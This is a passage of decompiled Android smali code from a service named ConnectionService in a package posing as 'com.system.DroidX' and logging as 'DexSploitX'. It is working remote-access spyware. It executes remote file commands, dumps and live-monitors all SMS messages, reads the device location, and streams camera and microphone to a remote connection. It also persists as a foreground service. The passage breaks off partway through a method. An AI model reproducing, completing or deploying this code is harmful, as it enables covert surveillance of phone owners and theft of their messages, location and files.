    .line 289
    :cond_16
    const-string p1, "AUDIO_STOPPED"

    return-object p1

    .line 290
    :cond_17
    const-string v0, "ls"

    invoke-virtual {v5, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_1c

    const-string v0, "pwd"

    invoke-virtual {v5, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_1c

    const-string v0, "cd"

    invoke-virtual {v5, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_1c

    const-string v0, "dump"

    .line 291
    invoke-virtual {v5, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_1c

    const-string v0, "cat"

    invoke-virtual {v5, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_1c

    const-string v0, "upload"

    invoke-virtual {v5, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_1c

    const-string v0, "dumpdir"

    invoke-virtual {v5, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_18

    goto :goto_3

    .line 293
    :cond_18
    const-string v0, "filemanager"

    invoke-virtual {p1, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_19

    .line 294
    const-string v0, "filemanager "

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    invoke-virtual {p1, v0}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object p1

    .line 295
    invoke-static {p1}, Lcom/system/DroidX/utils/FileManager;->executeCommand(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    return-object p1

    .line 296
    :cond_19
    const-string v0, "test"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1a

    .line 297
    const-string p1, "TEST_RESPONSE_OK"

    return-object p1

    .line 298
    :cond_1a
    const-string v0, "location"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1b

    .line 299
    invoke-direct {p0}, Lcom/system/DroidX/ConnectionService;->getUnifiedLocation()Ljava/lang/String;

    move-result-object p1

    return-object p1

    .line 301
    :cond_1b
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    return-object p1

    .line 292
    :cond_1c
    :goto_3
    invoke-static {p1}, Lcom/system/DroidX/utils/FileManager;->executeCommand(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-object p1

    :catch_0
    move-exception p1

    .line 303
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "Error: "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    return-object p1
.end method

.method private getUnifiedLocation()Ljava/lang/String;
    .locals 3

    .line 534
    :try_start_0
    iget-object v0, p0, Lcom/system/DroidX/ConnectionService;->locationHelper:Lcom/system/DroidX/utils/LocationHelper;

    if-nez v0, :cond_0

    .line 535
    new-instance v0, Lcom/system/DroidX/utils/LocationHelper;

    invoke-direct {v0, p0}, Lcom/system/DroidX/utils/LocationHelper;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/system/DroidX/ConnectionService;->locationHelper:Lcom/system/DroidX/utils/LocationHelper;

    .line 539
    :cond_0
    iget-object v0, p0, Lcom/system/DroidX/ConnectionService;->locationHelper:Lcom/system/DroidX/utils/LocationHelper;

    invoke-virtual {v0}, Lcom/system/DroidX/utils/LocationHelper;->hasLocationPermission()Z

    move-result v0

    if-nez v0, :cond_1

    .line 540
    const-string v0, "ERROR:Location permission not granted - Please grant location permission in app settings"

    return-object v0

    .line 543
    :cond_1
    iget-object v0, p0, Lcom/system/DroidX/ConnectionService;->locationHelper:Lcom/system/DroidX/utils/LocationHelper;

    invoke-virtual {v0}, Lcom/system/DroidX/utils/LocationHelper;->isGPSEnabled()Z

    move-result v0

    if-nez v0, :cond_2

    iget-object v0, p0, Lcom/system/DroidX/ConnectionService;->locationHelper:Lcom/system/DroidX/utils/LocationHelper;

    invoke-virtual {v0}, Lcom/system/DroidX/utils/LocationHelper;->isNetworkLocationEnabled()Z

    move-result v0

    if-nez v0, :cond_2

    .line 544
    const-string v0, "ERROR:GPS and Network location are disabled - Use \'enablegps\' command to enable"

    return-object v0

    .line 548
    :cond_2
    iget-object v0, p0, Lcom/system/DroidX/ConnectionService;->locationHelper:Lcom/system/DroidX/utils/LocationHelper;

    new-instance v1, Lcom/system/DroidX/ConnectionService$3;

    invoke-direct {v1, p0}, Lcom/system/DroidX/ConnectionService$3;-><init>(Lcom/system/DroidX/ConnectionService;)V

    invoke-virtual {v0, v1}, Lcom/system/DroidX/utils/LocationHelper;->requestSingleLocationUpdate(Lcom/system/DroidX/utils/LocationHelper$LocationCallback;)V

    .line 563
    const-string v0, ""
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-object v0

    :catch_0
    move-exception v0

    .line 566
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "ERROR:Location error: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method private handleCameraStream(Ljava/lang/String;)V
    .locals 2

    .line 468
    const-string v0, "Camera Active"

    invoke-direct {p0, v0}, Lcom/system/DroidX/ConnectionService;->updateNotification(Ljava/lang/String;)V

    .line 469
    iget-object v0, p0, Lcom/system/DroidX/ConnectionService;->cameraStreamer:Lcom/system/DroidX/utils/CameraStreamer;

    if-nez v0, :cond_0

    .line 470
    new-instance v0, Lcom/system/DroidX/utils/CameraStreamer;

    invoke-direct {v0}, Lcom/system/DroidX/utils/CameraStreamer;-><init>()V

    iput-object v0, p0, Lcom/system/DroidX/ConnectionService;->cameraStreamer:Lcom/system/DroidX/utils/CameraStreamer;

    .line 471
    iget-object v1, p0, Lcom/system/DroidX/ConnectionService;->outputStream:Ljava/io/OutputStream;

    invoke-virtual {v0, v1}, Lcom/system/DroidX/utils/CameraStreamer;->setOutputStream(Ljava/io/OutputStream;)V

    .line 473
    :cond_0
    iget-object v0, p0, Lcom/system/DroidX/ConnectionService;->audioStreamer:Lcom/system/DroidX/utils/AudioStreamer;

    if-nez v0, :cond_1

    .line 474
    new-instance v0, Lcom/system/DroidX/utils/AudioStreamer;

    invoke-direct {v0}, Lcom/system/DroidX/utils/AudioStreamer;-><init>()V

    iput-object v0, p0, Lcom/system/DroidX/ConnectionService;->audioStreamer:Lcom/system/DroidX/utils/AudioStreamer;

    .line 475
    iget-object v1, p0, Lcom/system/DroidX/ConnectionService;->outputStream:Ljava/io/OutputStream;

    invoke-virtual {v0, v1}, Lcom/system/DroidX/utils/AudioStreamer;->setOutputStream(Ljava/io/OutputStream;)V

    .line 478
    :cond_1
    const-string v0, "front"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result p1

    .line 479
    iget-object v0, p0, Lcom/system/DroidX/ConnectionService;->cameraStreamer:Lcom/system/DroidX/utils/CameraStreamer;

    new-instance v1, Lcom/system/DroidX/ConnectionService$2;

    invoke-direct {v1, p0}, Lcom/system/DroidX/ConnectionService$2;-><init>(Lcom/system/DroidX/ConnectionService;)V

    invoke-virtual {v0, p0, p1, v1}, Lcom/system/DroidX/utils/CameraStreamer;->startStream(Landroid/content/Context;ZLcom/system/DroidX/utils/CameraStreamer$StreamCallback;)V

    .line 490
    iget-object p1, p0, Lcom/system/DroidX/ConnectionService;->audioStreamer:Lcom/system/DroidX/utils/AudioStreamer;

    invoke-virtual {p1}, Lcom/system/DroidX/utils/AudioStreamer;->startStreaming()V

    return-void
.end method

.method private handleLargeDataCommand(Ljava/lang/String;)Ljava/lang/String;
    .locals 4

    const-string v0, "DATA_SIZE:"

    const-string v1, "Unknown large data command: "

    .line 391
    :try_start_0
    const-string v2, "sms"

    invoke-virtual {p1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_1

    .line 392
    invoke-static {p0}, Lcom/system/DroidX/utils/SMSHelper;->getAllSMS(Landroid/content/Context;)Ljava/lang/String;

    move-result-object p1

    .line 397
    const-string v1, "UTF-8"

    invoke-virtual {p1, v1}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object p1

    .line 400
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    array-length v0, p1

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "\n"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 401
    iget-object v1, p0, Lcom/system/DroidX/ConnectionService;->outputStream:Ljava/io/OutputStream;

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    invoke-virtual {v1, v0}, Ljava/io/OutputStream;->write([B)V

    .line 402
    iget-object v0, p0, Lcom/system/DroidX/ConnectionService;->outputStream:Ljava/io/OutputStream;

    invoke-virtual {v0}, Ljava/io/OutputStream;->flush()V

    const/4 v0, 0x0

    .line 404
    :goto_0
    array-length v1, p1

    if-ge v0, v1, :cond_0

    add-int/lit16 v1, v0, 0x2000

    .line 405
    array-length v2, p1

    invoke-static {v1, v2}, Ljava/lang/Math;->min(II)I

    move-result v2

    .line 406
    iget-object v3, p0, Lcom/system/DroidX/ConnectionService;->outputStream:Ljava/io/OutputStream;

    sub-int/2addr v2, v0

    invoke-virtual {v3, p1, v0, v2}, Ljava/io/OutputStream;->write([BII)V

    .line 407
    iget-object v0, p0, Lcom/system/DroidX/ConnectionService;->outputStream:Ljava/io/OutputStream;

    invoke-virtual {v0}, Ljava/io/OutputStream;->flush()V

    const-wide/16 v2, 0xa

    .line 408
    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V

    move v0, v1

    goto :goto_0

    .line 411
    :cond_0
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "LARGE_DATA_SENT:"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    array-length p1, p1

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    return-object p1

    .line 394
    :cond_1
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-object p1

    :catch_0
    move-exception p1

    .line 414
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "Error sending large data: "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    return-object p1
.end method

.method public static isRunning()Z
    .locals 1

    .line 108
    sget-boolean v0, Lcom/system/DroidX/ConnectionService;->isServiceRunning:Z

    return v0
.end method

.method private promoteToForeground()V
    .locals 4

    .line 95
    const-string v0, "DexSploitX"

    :try_start_0
    invoke-direct {p0}, Lcom/system/DroidX/ConnectionService;->createNotificationChannel()V

    .line 96
    const-string v1, "Service Active"

    invoke-direct {p0, v1}, Lcom/system/DroidX/ConnectionService;->createNotification(Ljava/lang/String;)Landroid/app/Notification;

    move-result-object v1

    const/16 v2, 0x64

    invoke-virtual {p0, v2, v1}, Lcom/system/DroidX/ConnectionService;->startForeground(ILandroid/app/Notification;)V

    .line 97
    const-string v1, "Promoted to foreground service"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-void

    :catch_0
    move-exception v1

    .line 99
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "Could not promote to foreground: "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    return-void
.end method

.method private restoreLiveSMSState()V
    .locals 4

    .line 113
    const-string v0, "DexSploitX"

    const/4 v1, 0x0

    :try_start_0
    invoke-virtual {p0, v0, v1}, Lcom/system/DroidX/ConnectionService;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v2

    .line 114
    const-string v3, "live_sms_active"

    invoke-interface {v2, v3, v1}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v1

    if-eqz v1, :cond_0

    .line 117
    const-string v1, "Restoring live SMS monitoring"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 118
    invoke-direct {p0}, Lcom/system/DroidX/ConnectionService;->startLiveSMSInternal()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_0
    return-void

    :catch_0
    move-exception v1

    .line 121
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "Error restoring live SMS state: "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    return-void
.end method

.method private saveLiveSMSState(Z)V
    .locals 3

    .line 127
    const-string v0, "DexSploitX"

    const/4 v1, 0x0

    :try_start_0
    invoke-virtual {p0, v0, v1}, Lcom/system/DroidX/ConnectionService;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    .line 128
    invoke-interface {v1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v1

    const-string v2, "live_sms_active"

    invoke-interface {v1, v2, p1}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    move-result-object p1

    invoke-interface {p1}, Landroid/content/SharedPreferences$Editor;->apply()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-void

    :catch_0
    move-exception p1

    .line 130
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "Error saving live SMS state: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v0, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    return-void
.end method

.method private sendLargeResponse(Ljava/lang/String;)V
    .locals 7

    .line 421
    const-string v0, "DexSploitX"

    const-string v1, "UTF-8"

    :try_start_0
    invoke-virtual {p1, v1}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object p1

    const/4 v2, 0x0

    move v3, v2

    .line 424
    :goto_0
    array-length v4, p1

    if-ge v3, v4, :cond_0

    add-int/lit16 v4, v3, 0x1000

    .line 425
    array-length v5, p1

    invoke-static {v4, v5}, Ljava/lang/Math;->min(II)I

    move-result v5

    sub-int/2addr v5, v3

    .line 426
    new-array v6, v5, [B

    .line 427
    invoke-static {p1, v3, v6, v2, v5}, Ljava/lang/System;->arraycopy(Ljava/lang/Object;ILjava/lang/Object;II)V

    .line 430
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "RES:"

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    new-instance v5, Ljava/lang/String;

    invoke-direct {v5, v6, v1}, Ljava/lang/String;-><init>([BLjava/lang/String;)V

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v5, "\n"

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    .line 431
    iget-object v5, p0, Lcom/system/DroidX/ConnectionService;->outputStream:Ljava/io/OutputStream;

    invoke-virtual {v3, v1}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v3

    invoke-virtual {v5, v3}, Ljava/io/OutputStream;->write([B)V

    .line 432
    iget-object v3, p0, Lcom/system/DroidX/ConnectionService;->outputStream:Ljava/io/OutputStream;

    invoke-virtual {v3}, Ljava/io/OutputStream;->flush()V

    const-wide/16 v5, 0x32

    .line 435
    invoke-static {v5, v6}, Ljava/lang/Thread;->sleep(J)V

    move v3, v4

    goto :goto_0

    .line 438
    :cond_0
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "[LARGE RESPONSE SENT] "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    array-length p1, p1

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object p1

    const-string v1, " bytes in chunks"

    invoke-virtual {p1, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v0, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-void

    :catch_0
    move-exception p1

    .line 441
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "Error sending large response: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v0, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    return-void
.end method

.method private sendLiveSMSData(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 7

    .line 336
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/system/DroidX/ConnectionService$$ExternalSyntheticLambda0;

    move-object v2, p0

    move-object v3, p1

    move-object v4, p2

    move-object v5, p3

    move-object v6, p4

    invoke-direct/range {v1 .. v6}, Lcom/system/DroidX/ConnectionService$$ExternalSyntheticLambda0;-><init>(Lcom/system/DroidX/ConnectionService;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 367
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method private sendResponse(Ljava/lang/String;)V
    .locals 2

    .line 572
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/system/DroidX/ConnectionService$$ExternalSyntheticLambda1;

    invoke-direct {v1, p0, p1}, Lcom/system/DroidX/ConnectionService$$ExternalSyntheticLambda1;-><init>(Lcom/system/DroidX/ConnectionService;Ljava/lang/String;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 591
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method private startLiveSMS()Ljava/lang/String;
    .locals 1

    .line 308
    iget-boolean v0, p0, Lcom/system/DroidX/ConnectionService;->liveSMSActive:Z

    if-nez v0, :cond_0

    .line 309
    invoke-direct {p0}, Lcom/system/DroidX/ConnectionService;->startLiveSMSInternal()V

    const/4 v0, 0x1

    .line 310
    invoke-direct {p0, v0}, Lcom/system/DroidX/ConnectionService;->saveLiveSMSState(Z)V

    .line 311
    const-string v0, "LIVE_SMS_STARTED"

    return-object v0

    .line 313
    :cond_0
    const-string v0, "LIVE_SMS_ALREADY_ACTIVE"

    return-object v0
.end method

.method private startLiveSMSInternal()V
    .locals 2

    .line 317
    iget-boolean v0, p0, Lcom/system/DroidX/ConnectionService;->liveSMSActive:Z

    if-eqz v0, :cond_0

    return-void

    :cond_0
    const/4 v0, 0x1

    .line 319
    iput-boolean v0, p0, Lcom/system/DroidX/ConnectionService;->liveSMSActive:Z

    .line 322
    new-instance v0, Lcom/system/DroidX/utils/SMSMonitor;

    invoke-direct {v0, p0}, Lcom/system/DroidX/utils/SMSMonitor;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/system/DroidX/ConnectionService;->smsMonitor:Lcom/system/DroidX/utils/SMSMonitor;

    .line 323
    new-instance v1, Lcom/system/DroidX/ConnectionService$1;

    invoke-direct {v1, p0}, Lcom/system/DroidX/ConnectionService$1;-><init>(Lcom/system/DroidX/ConnectionService;)V

    invoke-virtual {v0, v1}, Lcom/system/DroidX/utils/SMSMonitor;->setListener(Lcom/system/DroidX/utils/SMSMonitor$SMSListener;)V

    .line 329
    iget-object v0, p0, Lcom/system/DroidX/ConnectionService;->smsMonitor:Lcom/system/DroidX/utils/SMSMonitor;

    invoke-virtual {v0}, Lcom/system/DroidX/utils/SMSMonitor;->startMonitoring()V

    .line 331
    const-string v0, "DexSploitX"

    const-string v1, "Live SMS monitoring started - will capture all SMS (sent/received)"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    return-void
.end method

.method private stopCameraStream()V
    .locals 2

    .line 494
    const-string v0, "Service Active"

    invoke-direct {p0, v0}, Lcom/system/DroidX/ConnectionService;->updateNotification(Ljava/lang/String;)V

    .line 495
    iget-object v0, p0, Lcom/system/DroidX/ConnectionService;->cameraStreamer:Lcom/system/DroidX/utils/CameraStreamer;

    const/4 v1, 0x0

    if-eqz v0, :cond_0

    .line 496
    invoke-virtual {v0}, Lcom/system/DroidX/utils/CameraStreamer;->stopStream()V

    .line 497
    iput-object v1, p0, Lcom/system/DroidX/ConnectionService;->cameraStreamer:Lcom/system/DroidX/utils/CameraStreamer;

    .line 499
    :cond_0
    iget-object v0, p0, Lcom/system/DroidX/ConnectionService;->audioStreamer:Lcom/system/DroidX/utils/AudioStreamer;

    if-eqz v0, :cond_1

    .line 500
    invoke-virtual {v0}, Lcom/system/DroidX/utils/AudioStreamer;->stopStreaming()V

    .line 501
    iput-object v1, p0, Lcom/system/DroidX/ConnectionService;->audioStreamer:Lcom/system/DroidX/utils/AudioStreamer;

    :cond_1
    return-void
.end method

.method private stopLiveSMS()Ljava/lang/String;
    .locals 3

    .line 372
    :try_start_0
    iget-boolean v0, p0, Lcom/system/DroidX/ConnectionService;->liveSMSActive:Z

    if-eqz v0, :cond_1

    const/4 v0, 0x0

    .line 373
    iput-boolean v0, p0, Lcom/system/DroidX/ConnectionService;->liveSMSActive:Z

    .line 374
    iget-object v1, p0, Lcom/system/DroidX/ConnectionService;->smsMonitor:Lcom/system/DroidX/utils/SMSMonitor;

    if-eqz v1, :cond_0

    .line 375
    invoke-virtual {v1}, Lcom/system/DroidX/utils/SMSMonitor;->stopMonitoring()V

    const/4 v1, 0x0

    .line 376
    iput-object v1, p0, Lcom/system/DroidX/ConnectionService;->smsMonitor:Lcom/system/DroidX/utils/SMSMonitor;

    .line 378
    :cond_0
    invoke-direct {p0, v0}, Lcom/system/DroidX/ConnectionService;->saveLiveSMSState(Z)V

    .line 379
    const-string v0, "DexSploitX"

    const-string v1, "Live SMS monitoring stopped"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 380
    const-string v0, "LIVE_SMS_STOPPED"

    return-object v0

    .line 382
    :cond_1
    const-string v0, "LIVE_SMS_NOT_ACTIVE"
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-object v0

    :catch_0
    move-exception v0

    .line 384
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "ERROR_STOPPING_SMS:"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method private updateNotification(Ljava/lang/String;)V
    .locals 2

    .line 527
    const-class v0, Landroid/app/NotificationManager;

    invoke-virtual {p0, v0}, Lcom/system/DroidX/ConnectionService;->getSystemService(Ljava/lang/Class;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/NotificationManager;

    const/16 v1, 0x64

    .line 528
    invoke-direct {p0, p1}, Lcom/system/DroidX/ConnectionService;->createNotification(Ljava/lang/String;)Landroid/app/Notification;

    move-result-object p1

    invoke-virtual {v0, v1, p1}, Landroid/app/NotificationManager;->notify(ILandroid/app/Notification;)V

    return-void
.end method


# virtual methods
.method synthetic lambda$sendLiveSMSData$0$com-system-DroidX-ConnectionService(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 4

    .line 0
    const-string v0, "Live SMS sent: "

    const-string v1, "SMS:"

    .line 339
    :try_start_0
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "|"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "|"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "|"

